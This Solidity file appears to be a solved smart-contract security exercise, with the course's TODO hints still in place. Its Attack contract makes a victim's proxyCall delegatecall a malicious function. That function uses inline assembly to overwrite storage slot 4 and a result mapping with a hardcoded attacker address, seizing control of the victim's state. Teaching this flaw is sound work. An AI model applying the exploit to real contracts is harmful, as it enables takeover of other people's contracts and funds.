// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
    // REF: https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018
    function malicious() external {
        address hacker = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
        bytes32 resultKey = keccak256(abi.encode(hacker, 5));
        assembly {
            sstore(resultKey, true)
            sstore(4, hacker) 
        }
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSelector(this.malicious.selector);
        ID31eg4t3(victim).proxyCall(data);
    }
}
